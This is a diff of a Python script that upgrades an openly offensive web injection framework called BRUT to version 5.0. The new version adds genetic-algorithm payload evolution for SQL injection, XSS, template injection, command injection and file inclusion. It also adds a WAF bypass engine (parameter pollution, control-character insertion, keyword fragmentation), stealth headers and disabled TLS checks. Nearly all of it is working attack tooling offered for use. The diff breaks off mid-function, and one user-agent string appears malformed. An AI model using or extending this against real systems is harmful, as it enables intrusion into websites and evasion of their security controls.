@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 """
-BRUT v4.0 - Ultimate ML-Driven Payload Injection Testing Framework
+BRUT v5.0 - Ultimate Genetic ML Payload Injection Framework
 ====================================================================
-ALL features combined:
-- DEEP Parameter Discovery (crawl + fuzz + sitemap + robots + endpoints + path)
-- ML Payload Generator (17+ SQLi, 24+ XSS, 18+ SSTI, 16+ CMDi, 16+ LFI, XXE, CRLF, Redirect)
-- 20 Mutation Techniques (case, comment, homoglyph, zero-width, nested encoding, etc)
-- Feedback Learning (adapts from every server response)
-- WAF Detection (Cloudflare, ModSecurity, Incapsula, Sucuri, Akamai, AWS, F5)
-- Server Tech Detection (PHP, Python, Java, .NET, Node.js, Ruby + DB + Framework)
-- Stealth Injection (httpx HTTP/2 + Playwright browser)
-- Detailed Logger (payload + response snippet + status meaning + time)
-- Auto Report Save (TXT + JSON)
+ALL v4.0 features preserved + NEW:
+- State-Action-Reward Schema (strict feedback loop)
+- Genetic Algorithm Engine (crossover, mutation, selection, generations)
+- Grammar-Based Generation (SQL/HTML/Shell syntax validation)
+- Negative Selection Reinforcement (blacklist failed mutations)
+- WAF Bypass Engine (HPP, smuggling, fragmentation)
+- Context-Aware Polyglot Generator
+- Adaptive Encoding Rotation (dynamic layered encoding)
+- AST-Based Mutation & Crossover
+- Mutation Directive System
+- Anomaly Scoring
 """
 
 import os
@@ -23,6 +24,7 @@ import random
 import string
 import hashlib
 import base64
+import uuid
 import subprocess
 import warnings
 import itertools
@@ -33,9 +35,10 @@ from urllib.parse import (
     quote, quote_plus, unquote
 )
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Dict, List, Any, Optional, Tuple
+from typing import Dict, List, Any, Optional, Tuple, Set
 from dataclasses import dataclass, field, asdict
 from collections import Counter, defaultdict
+from enum import Enum
 
 warnings.filterwarnings("ignore")
 
@@ -104,9 +107,8 @@ REQUIRED_DEPS = [
 
 
 def install_dependencies():
-    """Cek dan install dependencies otomatis."""
     print("\n\033[36m" + "=" * 60)
-    print("  BRUT v4.0: Dependency Manager")
+    print("  BRUT v5.0: Dependency Manager")
     print("=" * 60 + "\033[0m\n")
 
     missing = []
@@ -253,26 +255,33 @@ def print_banner():
  / /_/ / /  / /_/ / /_/  __/ ____/ /___
 /_____/_/   \\__,_/\\__/\\___/_/   /_____/
 \033[0m                                       
-\033[1;33m    ═══════════════════════════════════════════════════════════\033[0m
-\033[1;37m      BRUT v4.0 — Ultimate ML Payload Injection + Deep Discovery\033[0m
-\033[1;33m    ═══════════════════════════════════════════════════════════\033[0m
+\033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
+\033[1;37m      BRUT v5.0 — Genetic ML Payload Evolution Framework\033[0m
+\033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
 
-\033[36m    ┌─────────────────────────────────────────────────────────┐\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m DEEP Discovery     (crawl + fuzz + sitemap + robots)\033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m ML Payload Gen     (builds from scratch, 100+ strats)\033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m 20 Mutations       (homoglyph, zero-width, nested)  \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Feedback Learning  (adapts from every response)     \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m WAF Detection      (CF, ModSec, Imperva, Sucuri)    \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Tech Detection     (PHP/Python/Java + MySQL/PG)     \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Stealth Injection  (httpx HTTP/2 + Playwright)      \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Response Analyzer  (Server vs Raw HTML vs Blocked)  \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Detailed Logger    (payload + snippet + status)     \033[36m│\033[0m
-\033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save   (TXT + JSON)                     \033[36m│\033[0m
-\033[36m    └─────────────────────────────────────────────────────────┘\033[0m
+\033[36m    ┌─────────────────────────────────────────────────────────────┐\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m DEEP Discovery       (crawl+fuzz+sitemap+robots+endpts)\033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Genetic Algorithm    (crossover+mutation+selection)    \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Grammar Validation   (SQL/HTML/Shell syntax check)     \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m State-Action-Reward  (strict feedback loop schema)     \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Negative Selection   (blacklist failed mutations)      \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m WAF Bypass Engine    (HPP+smuggling+fragmentation)     \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Polyglot Generator   (multi-context payloads)          \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Adaptive Encoding    (dynamic layered rotation)        \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Context-Aware        (string/numeric/attr/HREF detect) \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m ML Payload Gen       (100+ strategies from scratch)    \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m 20+ Mutations        (homoglyph+zero-width+nested)     \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Feedback Learning    (adapts from every response)      \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m WAF Detection        (CF+ModSec+Imperva+Sucuri+Akamai) \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Tech Detection       (PHP/Python/Java/Node + DB)       \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Stealth Injection    (httpx HTTP/2 + Playwright)       \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Detailed Logger      (payload+snippet+status+time)     \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save     (TXT + JSON + Evolution Log)      \033[36m│\033[0m
+\033[36m    └─────────────────────────────────────────────────────────────┘\033[0m
 
 \033[1;35m    Mode    :\033[0m Interactive  |  \033[1;35mSpecial:\033[0m /exit, max
 \033[1;35m    Length  :\033[0m short, long, super-long, ultra-long
-\033[1;35m    ML      :\033[0m Adaptive feedback learning enabled
+\033[1;35m    ML      :\033[0m Genetic + Reinforcement Learning
 \033[1;35m    Date    :\033[0m {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
     print(banner)
@@ -286,17 +295,14 @@ STEALTH_HEADERS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/5336 Edg/120.0.0.0",
 ]
 
 
 def get_stealth_client():
-    """Buat HTTP client dengan stealth headers + HTTP/2 fallback."""
     if not HAS_HTTPX:
         return None
-
     ua = UA_ROTATOR.random if HAS_FAKE_UA else random.choice(STEALTH_HEADERS)
-
     headers = {
         "User-Agent": ua,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -311,38 +317,1253 @@ def get_stealth_client():
         "Cache-Control": "max-age=0",
         "DNT": "1",
     }
-
     if HAS_H2:
         try:
             return httpx.Client(
-                headers=headers,
-                follow_redirects=True,
-                timeout=30.0,
-                verify=False,
-                http2=True,
+                headers=headers, follow_redirects=True, timeout=30.0,
+                verify=False, http2=True,
                 limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
             )
         except (ImportError, Exception):
             pass
-
     return httpx.Client(
-        headers=headers,
-        follow_redirects=True,
-        timeout=30.0,
-        verify=False,
-        http2=False,
+        headers=headers, follow_redirects=True, timeout=30.0,
+        verify=False, http2=False,
         limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
     )
 
 
 # ============================================================
-# PARAMETER DISCOVERY (DEEP v4.0)
+# ENUMS & CONSTANTS
+# ============================================================
+class InjectionContext(Enum):
+    """Konteks di mana parameter dimasukkan."""
+    SQL_STRING = "sql_string"           # 'PARAM' or "PARAM"
+    SQL_NUMERIC = "sql_numeric"         # WHERE id=PARAM
+    SQL_IDENTIFIER = "sql_identifier"   # ORDER BY PARAM
+    HTML_BODY = "html_body"             # <div>PARAM</div>
+    HTML_ATTRIBUTE = "html_attribute"   # <input value="PARAM">
+    HTML_HREF = "html_href"             # <a href="PARAM">
+    HTML_SCRIPT = "html_script"         # <script>var x="PARAM"</script>
+    JS_STRING = "js_string"             # var x='PARAM'
+    URL_PARAM = "url_param"             # ?key=PARAM
+    SHELL_ARG = "shell_arg"             # command PARAM
+    SHELL_STRING = "shell_string"       # command "PARAM"
+    UNKNOWN = "unknown"
+
+
+class MutationType(Enum):
+    """Tipe mutasi yang bisa diterapkan."""
+    CASE_VARIATION = "case_variation"
+    COMMENT_INSERTION = "comment_insertion"
+    WHITESPACE_PADDING = "whitespace_padding"
+    CHAR_ENCODING = "char_encoding"
+    STRING_CONCAT = "string_concat"
+    NULL_BYTE_APPEND = "null_byte_append"
+    UNICODE_NORMALIZE = "unicode_normalize"
+    DOUBLE_ENCODING = "double_encoding"
+    HTML_ENTITY_MIX = "html_entity_mix"
+    NESTED_ENCODING = "nested_encoding"
+    KEYWORD_SPLIT = "keyword_split"
+    ALTERNATIVE_SYNTAX = "alternative_syntax"
+    HOMOGLYPH = "homoglyph"
+    BACKSLASH_ESCAPE = "backslash_escape"
+    NEWLINE_INJECTION = "newline_injection"
+    TAB_SEPARATION = "tab_separation"
+    BLOCK_COMMENT_WRAP = "block_comment_wrap"
+    INLINE_COMMENT_SPLIT = "inline_comment_split"
+    RECURSIVE_ENCODE = "recursive_encode"
+    ZERO_WIDTH_INSERT = "zero_width_insert"
+    URL_ENCODE = "url_encode"
+    HEX_ENCODE = "hex_encode"
+    OCTAL_ENCODE = "octal_encode"
+    HPP_SPLIT = "hpp_split"
+    CONTROL_CHAR_INSERT = "control_char_insert"
+
+
+# ============================================================
+# STATE-ACTION-REWARD SCHEMA (Strict Feedback Loop)
+# ============================================================
+@dataclass
+class EvolutionRecord:
+    """Mencatat setiap payload dan evolusinya secara terstruktur."""
+    generation_id: str = ""
+    parent_payload_id: str = ""
+    generation_number: int = 0
+    mutation_history: List[str] = field(default_factory=list)
+    payload_syntax: str = ""
+    category: str = ""
+    strategy: str = ""
+    execution_context: Dict[str, Any] = field(default_factory=dict)
+    feedback_loop: Dict[str, Any] = field(default_factory=dict)
+    fitness_score: float = 0.0
+    is_alive: bool = True
+
+    def to_dict(self):
+        return asdict(self)
+
+
+class EvolutionSchema:
+    """
+    Schema ketat untuk siklus evolusi payload.
+    Mencatat State-Action-Reward untuk setiap generasi.
+    """
+
+    def __init__(self):
+        self.records: Dict[str, EvolutionRecord] = {}
+        self.generation_counter = 0
+        self.blocked_mutations: Set[str] = set()  # Negative selection
+        self.successful_chains: List[Dict] = []
+        self.mutation_blacklist_count: Dict[str, int] = defaultdict(int)
+        self.encoding_blacklist_count: Dict[str, int] = defaultdict(int)
+
+    def create_record(self, payload_dict: Dict, parent_id: str = "",
+                     mutations: List[str] = None) -> EvolutionRecord:
+        self.generation_counter += 1
+        gen_id = str(uuid.uuid4())[:8]
+        record = EvolutionRecord(
+            generation_id=gen_id,
+            parent_payload_id=parent_id,
+            generation_number=self.generation_counter,
+            mutation_history=mutations or [],
+            payload_syntax=payload_dict.get("payload", "")[:200],
+            category=payload_dict.get("category", ""),
+            strategy=payload_dict.get("strategy", ""),
+            execution_context={
+                "vulnerability_type": payload_dict.get("category", ""),
+                "target_parser": "",
+                "waf_detected": "",
+                "length_tier": payload_dict.get("length_tier", ""),
+            },
+        )
+        self.records[gen_id] = record
+        return record
+
+    def record_feedback(self, gen_id: str, status_code: int,
+                       response_signature: str, response_type: str,
+                       anomaly_score: float, waf_detected: str = ""):
+        if gen_id not in self.records:
+            return
+        record = self.records[gen_id]
+
+        # Generate mutation directive
+        directive = self._generate_directive(status_code, response_type,
+                                            response_signature, record)
+
+        record.feedback_loop = {
+            "http_status_code": status_code,
+            "response_signature": response_signature[:100],
+            "response_type": response_type,
+            "anomaly_score": anomaly_score,
+            "mutation_directive": directive,
+            "timestamp": datetime.now().isoformat(),
+        }
+
+        if waf_detected:
+            record.execution_context["waf_detected"] = waf_detected
+
+        # Calculate fitness
+        record.fitness_score = self._calculate_fitness(
+            status_code, response_type, anomaly_score
+        )
+
+        # Negative selection: blacklist failed mutation combinations
+        if response_type == "blocked":
+            for mut in record.mutation_history:
+                self.mutation_blacklist_count[mut] += 1
+                if self.mutation_blacklist_count[mut] >= 3:
+                    self.blocked_mutations.add(mut)
+
+        # Record successful chains
+        if response_type == "server_output":
+            record.is_alive = True
+            self.successful_chains.append({
+                "generation_id": gen_id,
+                "parent_id": record.parent_payload_id,
+                "mutations": record.mutation_history,
+                "category": record.category,
+                "strategy": record.strategy,
+                "fitness": record.fitness_score,
+                "directive": directive,
+            })
+        else:
+            record.is_alive = False
+
+    def _calculate_fitness(self, status: int, resp_type: str,
+                          anomaly: float) -> float:
+        if resp_type == "server_output":
+            return 1.0
+        elif resp_type == "raw_html":
+            if status == 200:
+                return 0.3 + (anomaly / 200.0)
+            return 0.1
+        elif resp_type == "blocked":
+            return max(0.0, 0.1 - (anomaly / 500.0))
+        return 0.0
+
+    def _generate_directive(self, status: int, resp_type: str,
+                           signature: str, record: EvolutionRecord) -> str:
+        if resp_type == "server_output":
+            return "SUCCESS - Exploit this pattern, create variants"
+        elif resp_type == "blocked":
+            if status == 403:
+                return "WAF BLOCKED - Increase obfuscation, try alternative encoding, avoid keyword blocklist"
+            elif status == 429:
+                return "RATE LIMITED - Slow down, reduce request frequency"
+            elif status == 406:
+                return "NOT ACCEPTABLE - Change content type or encoding"
+            else:
+                return f"BLOCKED ({status}) - Drastically change strategy, use different category"
+        elif resp_type == "raw_html":
+            return "NORMAL RESPONSE - Payload not effective, try different injection context or category"
+        return "UNKNOWN - Explore new strategies"
+
+    def get_blocked_mutations(self) -> Set[str]:
+        return self.blocked_mutations.copy()
+
+    def get_best_parents(self, top_n: int = 10) -> List[EvolutionRecord]:
+        alive = [r for r in self.records.values() if r.fitness_score > 0.2]
+        alive.sort(key=lambda r: r.fitness_score, reverse=True)
+        return alive[:top_n]
+
+    def get_evolution_log(self) -> List[Dict]:
+        log = []
+        for gen_id, record in self.records.items():
+            log.append({
+                "gen_id": gen_id,
+                "parent_id": record.parent_payload_id,
+                "gen_num": record.generation_number,
+                "category": record.category,
+                "strategy": record.strategy,
+                "mutations": record.mutation_history,
+                "fitness": record.fitness_score,
+                "alive": record.is_alive,
+                "feedback": record.feedback_loop,
+            })
+        return log
+
+    def print_evolution_summary(self):
+        total = len(self.records)
+        alive = sum(1 for r in self.records.values() if r.is_alive)
+        blocked_muts = len(self.blocked_mutations)
+        best_fitness = max((r.fitness_score for r in self.records.values()), default=0)
+        avg_fitness = (sum(r.fitness_score for r in self.records.values()) / max(1, total))
+
+        print(f"\n  \033[1;36m[EVOLUTION]\033[0m Summary:")
+        print(f"    Generations    : {total}")
+        print(f"    Alive (fit>0)  : {alive}")
+        print(f"    Best fitness   : {best_fitness:.3f}")
+        print(f"    Avg fitness    : {avg_fitness:.3f}")
+        print(f"    Blocked muts   : {blocked_muts} {list(self.blocked_mutations)[:5] if blocked_muts else ''}")
+        print(f"    Success chains : {len(self.successful_chains)}")
+
+
+# ============================================================
+# GRAMMAR VALIDATOR (Keeps Payloads Syntactically Valid)
+# ============================================================
+class GrammarValidator:
+    """
+    Memvalidasi bahwa payload tetap valid secara sintaks
+    untuk interpreter target (SQL, HTML, Shell).
+    """
+
+    # SQL keywords that must appear in valid order
+    SQL_KEYWORD_ORDER = [
+        "SELECT", "FROM", "WHERE", "GROUP BY", "HAVING",
+        "ORDER BY", "LIMIT", "UNION", "INSERT", "UPDATE",
+        "DELETE", "DROP", "CREATE", "ALTER"
+    ]
+
+    # Valid SQL function patterns
+    SQL_FUNCTIONS = [
+        r"CONCAT\s*$", r"SUBSTRING\s*$", r"ASCII\s*$",
+        r"CHAR\s*$", r"LENGTH\s*$", r"VERSION\s*$",
+        r"DATABASE\s*$", r"USER\s*$", r"COUNT\s*$",
+        r"GROUP_CONCAT\s*$", r"HEX\s*$", r"UNHEX\s*$",
+        r"SLEEP\s*$", r"BENCHMARK\s*$", r"IF\s*$",
+        r"IFNULL\s*$", r"COALESCE\s*$", r"MID\s*$",
+        r"LEFT\s*$", r"RIGHT\s*$", r"TRIM\s*$",
+        r"UPPER\s*$", r"LOWER\s*$", r"CAST\s*$",
+        r"CONVERT\s*$", r"LOAD_FILE\s*$",
+    ]
+
+    # Valid HTML tag patterns
+    HTML_TAGS = [
+        "script", "img", "svg", "iframe", "body", "input", "details",
+        "video", "audio", "marquee", "math", "object", "embed",
+        "link", "meta", "base", "form", "button", "select",
+        "textarea", "style", "div", "span", "a", "p", "h1",
+        "table", "tr", "td", "noscript", "template", "slot",
+    ]
+
+    # Valid HTML event handlers
+    HTML_EVENTS = [
+        "onload", "onerror", "onmouseover", "onfocus", "onblur",
+        "onanimationend", "onclick", "onsubmit", "onchange",
+        "oninput", "onkeydown", "onkeyup", "onmousedown",
+        "onscroll", "ontoggle", "onpageshow", "onbeforeunload",
+        "onhashchange", "onresize", "onwheel", "ondrag",
+        "ondrop", "oncopy", "onpaste", "oncut", "ondblclick",
+        "oncontextmenu", "onpointerdown", "onpointerup",
+        "onanimationstart", "ontransitionend", "ontouchstart",
+    ]
+
+    # Shell command separators
+    SHELL_SEPARATORS = [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a"]
+
+    def validate_sql(self, payload: str) -> Tuple[bool, str]:
+        upper = payload.upper()
+        # Check balanced parentheses
+        paren_count = 0
+        for c in payload:
+            if c == '(': paren_count += 1
+            elif c == ')': paren_count -= 1
+            if paren_count < 0:
+                return False, "Unbalanced parentheses"
+
+        if paren_count != 0:
+            return False, "Unbalanced parentheses"
+
+        # Check balanced quotes (approximate)
+        single_quotes = payload.count("'") - payload.count("\\'")
+        double_quotes = payload.count('"') - payload.count('\\"')
+        # Odd quotes might be intentional (breaking out of string)
+        # This is OK for SQLi payloads
+
+        # Check UNION SELECT structure
+        if "UNION" in upper and "SELECT" in upper:
+            union_pos = upper.find("UNION")
+            select_pos = upper.find("SELECT", union_pos)
+            if select_pos == -1:
+                return False, "UNION without SELECT"
+
+        # Check for valid comment endings
+        if "--" in payload and not payload.rstrip().endswith(("--", "-- ", "--+", "#", "/**/")):
+            pass  # Comments in middle are OK
+
+        return True, "Valid SQL syntax"
+
+    def validate_xss(self, payload: str) -> Tuple[bool, str]:
+        lower = payload.lower()
+
+        # Check tag-event pairing
+        tag_pattern = re.compile(r'<(\w+)[^>]*\s(on\w+)\s*=', re.I)
+        for match in tag_pattern.finditer(payload):
+            tag = match.group(1).lower()
+            event = match.group(2).lower()
+            if tag not in self.HTML_TAGS and tag not in ["animate", "set", "mtext",
+                                                          "mglyph", "foreignobject",
+                                                          "source", "track"]:
+                return False, f"Unknown tag: {tag}"
+
+        # Check balanced angle brackets (approximate)
+        # For XSS, unclosed tags are often intentional
+        if "<" in payload and ">" not in payload:
+            # Check if it's a context-breaking payload
+            if "on" in lower and "=" in payload:
+                pass  # Event handler without closing tag is OK
+            elif "script" in lower or "svg" in lower:
+                return True, "Unclosed tag (intentional for context)"
+
+        return True, "Valid XSS syntax"
+
+    def validate_cmdi(self, payload: str) -> Tuple[bool, str]:
+        # Check for valid command separator at start
+        starts_with_sep = any(payload.startswith(sep) for sep in
+                            [";", "|", "`", "$(", "\n", "%0a", "%0d", "&"])
+        if not starts_with_sep and not payload.startswith("$"):
+            # Could be a direct command
+            pass
+
+        # Check balanced backticks
+        backtick_count = payload.count("`")
+        if backtick_count % 2 != 0:
+            return False, "Unbalanced backticks"
+
+        # Check balanced $()
+        subshell_count = payload.count("$(")
+        close_paren = payload.count(")")
+        if subshell_count > close_paren:
+            return False, "Unbalanced subshell"
+
+        return True, "Valid shell syntax"
+
+    def validate_ssti(self, payload: str) -> Tuple[bool, str]:
+        # Check balanced template delimiters
+        pairs = [
+            ("{{", "}}"), ("${", "}"), ("#{", "}"),
+            ("<%", "%>"), ("{%", "%}"), ("[[", "]]"),
+        ]
+        for open_d, close_d in pairs:
+            if open_d in payload:
+                if close_d not in payload:
+                    return False, f"Unmatched delimiter: {open_d} without {close_d}"
+
+        return True, "Valid SSTI syntax"
+
+    def validate_lfi(self, payload: str) -> Tuple[bool, str]:
+        # Check path traversal structure
+        if "../" in payload or "..\\" in payload or "%2e%2e" in payload.lower():
+            # Valid traversal pattern
+            return True, "Valid LFI syntax"
+
+        # Check wrapper syntax
+        if "://" in payload:
+            parts = payload.split("://")
+            if len(parts) >= 2:
+                return True, "Valid wrapper syntax"
+
+        return True, "Valid LFI syntax"
+
+    def validate(self, payload: str, category: str) -> Tuple[bool, str]:
+        validators = {
+            "sqli": self.validate_sql,
+            "xss": self.validate_xss,
+            "cmdi": self.validate_cmdi,
+            "ssti": self.validate_ssti,
+            "lfi": self.validate_lfi,
+        }
+        validator = validators.get(category)
+        if validator:
+            return validator(payload)
+        return True, "No grammar rules for category"
+
+
+# ============================================================
+# CONTEXT DETECTOR
+# ============================================================
+class ContextDetector:
+    """
+    Mendeteksi konteks injeksi dari respons server.
+    Menentukan di mana parameter dimasukkan (SQL string, HTML body, etc).
+    """
+
+    def __init__(self):
+        self.context_patterns = {
+            InjectionContext.SQL_STRING: [
+                r"'[^']*PARAM[^']*'",
+                r'"[^"]*PARAM[^"]*"',
+                r"WHERE\s+\w+\s*=\s*['\"]",
+                r"mysql", r"sql", r"query",
+            ],
+            InjectionContext.SQL_NUMERIC: [
+                r"WHERE\s+\w+\s*=\s*\d",
+                r"LIMIT\s+\d",
+                r"id\s*=\s*\d",
+            ],
+            InjectionContext.HTML_BODY: [
+                r"<[^>]*>.*PARAM.*</",
+                r"<div[^>]*>.*PARAM",
+                r"<p[^>]*>.*PARAM",
+                r"<span[^>]*>.*PARAM",
+            ],
+            InjectionContext.HTML_ATTRIBUTE: [
+                r'value\s*=\s*"[^"]*PARAM',
+                r'value\s*=\s*\'[^\']*PARAM',
+                r'placeholder\s*=\s*"[^"]*PARAM',
+            ],
+            InjectionContext.HTML_HREF: [
+                r'href\s*=\s*"[^"]*PARAM',
+                r'src\s*=\s*"[^"]*PARAM',
+                r'action\s*=\s*"[^"]*PARAM',
+            ],
+            InjectionContext.HTML_SCRIPT: [
+                r'<script[^>]*>.*PARAM',
+                r'var\s+\w+\s*=\s*["\'].*PARAM',
+                r'document\.\w+.*PARAM',
+            ],
+            InjectionContext.SHELL_ARG: [
+                r'shell_exec', r'exec\s*$', r'system\s*$',
+                r'passthru', r'proc_open', r'popen',
+            ],
+        }
+
+    def detect_context(self, response_text: str, param_name: str,
+                      param_value: str) -> InjectionContext:
+        if not response_text:
+            return InjectionContext.UNKNOWN
+
+        text = response_text.lower()
+        param_lower = param_value.lower()
+
+        scores = {}
+        for context, patterns in self.context_patterns.items():
+            score = 0
+            for pattern in patterns:
+                try:
+                    if re.search(pattern, response_text, re.I):
+                        score += 1
+                    if param_lower in text:
+                        # Check if param appears inside quotes
+                        if f"'{param_lower}'" in text or f'"{param_lower}"' in text:
+                            if context in [InjectionContext.SQL_STRING,
+                                         InjectionContext.HTML_ATTRIBUTE]:
+                                score += 2
+                except re.error:
+                    continue
+            scores[context] = score
+
+        if scores:
+            best = max(scores, key=scores.get)
+            if scores[best] > 0:
+                return best
+
+        # Heuristic fallback
+        if any(kw in text for kw in ["mysql", "sql", "query", "database", "table"]):
+            return InjectionContext.SQL_STRING
+        if any(kw in text for kw in ["<script", "javascript", "document."]):
+            return InjectionContext.HTML_SCRIPT
+        if any(kw in text for kw in ["shell_exec", "exec(", "system("]):
+            return InjectionContext.SHELL_ARG
+
+        return InjectionContext.UNKNOWN
+
+    def get_recommended_categories(self, context: InjectionContext) -> List[str]:
+        recommendations = {
+            InjectionContext.SQL_STRING: ["sqli", "xss", "ssti"],
+            InjectionContext.SQL_NUMERIC: ["sqli", "xss"],
+            InjectionContext.SQL_IDENTIFIER: ["sqli"],
+            InjectionContext.HTML_BODY: ["xss", "ssti"],
+            InjectionContext.HTML_ATTRIBUTE: ["xss", "sqli"],
+            InjectionContext.HTML_HREF: ["xss", "redirect", "sqli"],
+            InjectionContext.HTML_SCRIPT: ["xss", "ssti"],
+            InjectionContext.JS_STRING: ["xss", "ssti"],
+            InjectionContext.URL_PARAM: ["redirect", "lfi", "sqli", "xss"],
+            InjectionContext.SHELL_ARG: ["cmdi", "sqli"],
+            InjectionContext.SHELL_STRING: ["cmdi"],
+            InjectionContext.UNKNOWN: ["sqli", "xss", "ssti", "cmdi", "lfi"],
+        }
+        return recommendations.get(context, ["sqli", "xss", "ssti", "cmdi", "lfi"])
+
+
+# ============================================================
+# WAF BYPASS ENGINE
+# ============================================================
+class WAFBypassEngine:
+    """
+    Teknik bypass WAF lanjutan:
+    - HTTP Parameter Pollution (HPP)
+    - Null Byte & Control Character Insertion
+    - Protocol Smuggling
+    - WAF Signature Fragmentation
+    """
+
+    CONTROL_CHARS = ["%00", "%01", "%02", "%03", "%04", "%05",
+                     "%06", "%07", "%08", "%09", "%0b", "%0c",
+                     "%0e", "%0f", "%10", "%11", "%12", "%13",
+                     "%14", "%15", "%16", "%17", "%18", "%19",
+                     "%1a", "%1b", "%1c", "%1d", "%1e", "%1f"]
+
+    NON_STANDARD_WHITESPACE = [
+        "%09", "%0a", "%0b", "%0c", "%0d", "%20",
+        "%a0", "%c2%a0",  # non-breaking space
+        "%e2%80%80", "%e2%80%81", "%e2%80%82",  # en/fig/em spaces
+        "%e2%80%83", "%e2%80%84", "%e2%80%85",
+        "%e2%80%86", "%e2%80%87", "%e2%80%88",
+        "%e2%80%89", "%e2%80%8a",
+    ]
+
+    def apply_hpp(self, param_name: str, payload: str) -> Dict[str, List[str]]:
+        """HTTP Parameter Pollution: split payload across multiple same-name params."""
+        parts = self._split_payload_smart(payload)
+        if len(parts) <= 1:
+            return {param_name: [payload]}
+
+        result = {}
+        for i, part in enumerate(parts):
+            key = param_name if i == 0 else param_name
+            if key not in result:
+                result[key] = []
+            result[key].append(part)
+        return result
+
+    def _split_payload_smart(self, payload: str) -> List[str]:
+        """Split payload di posisi yang aman (tidak merusak sintaks)."""
+        if len(payload) < 10:
+            return [payload]
+
+        # Try splitting at whitespace/comment boundaries
+        split_points = []
+        for i, c in enumerate(payload):
+            if c in [' ', '\t', '\n']:
+                split_points.append(i)
+            if payload[i:i+4] == "/**/":
+                split_points.append(i + 2)
+
+        if not split_points:
+            # Force split at midpoint
+            mid = len(payload) // 2
+            return [payload[:mid], payload[mid:]]
+
+        # Pick 2-3 split points
+        num_splits = min(3, len(split_points))
+        chosen = random.sample(split_points, min(num_splits, len(split_points)))
+        chosen.sort()
+
+        parts = []
+        prev = 0
+        for sp in chosen:
+            if sp > prev:
+                parts.append(payload[prev:sp])
+            prev = sp
+        if prev < len(payload):
+            parts.append(payload[prev:])
+
+        return [p for p in parts if p]
+
+    def insert_control_chars(self, payload: str, density: float = 0.1) -> str:
+        """Sisipkan control characters untuk memecah regex WAF."""
+        result = list(payload)
+        insertions = int(len(payload) * density)
+        for _ in range(insertions):
+            pos = random.randint(1, len(result) - 1)
+            char = random.choice(self.CONTROL_CHARS)
+            result.insert(pos, char)
+        return "".join(result)
+
+    def insert_non_standard_whitespace(self, payload: str) -> str:
+        """Ganti spasi standar dengan whitespace non-standar."""
+        ws = random.choice(self.NON_STANDARD_WHITESPACE)
+        return payload.replace(" ", ws)
+
+    def fragment_signature(self, payload: str, category: str) -> str:
+        """Pecah signature yang dikenal WAF dengan teknik yang valid."""
+        if category == "sqli":
+            # Fragment SQL keywords with comments
+            keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
+                       "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP",
+                       "BENCHMARK", "WAITFOR", "DELAY"]
+            result = payload
+            for kw in keywords:
+                if kw.lower() in result.lower():
+                    frag_methods = [
+                        lambda k: f"{k[:2]}/**/{k[2:]}",
+                        lambda k: f"{k[:3]}/*!*/{k[3:]}" if len(k) > 3 else f"{k[:1]}/**/{k[1:]}",
+                        lambda k: f"{k[:1]}/*!50000{k[1:]}*/" if len(k) > 1 else k,
+                        lambda k: k.replace("", "/**/")[4:-4],  # /**/S/**/E/**/L...
+                        lambda k: "".join(c.upper() if i % 2 == 0 else c.lower()
+                                         for i, c in enumerate(k)),
+                    ]
+                    method = random.choice(frag_methods)
+                    try:
+                        replacement = method(kw)
+                        result = re.sub(re.escape(kw), replacement, result,
+                                       count=1, flags=re.I)
+                    except:
+                        continue
+            return result
+
+        elif category == "xss":
+            # Fragment XSS patterns
+            result = payload
+            if "<script>" in result.lower():
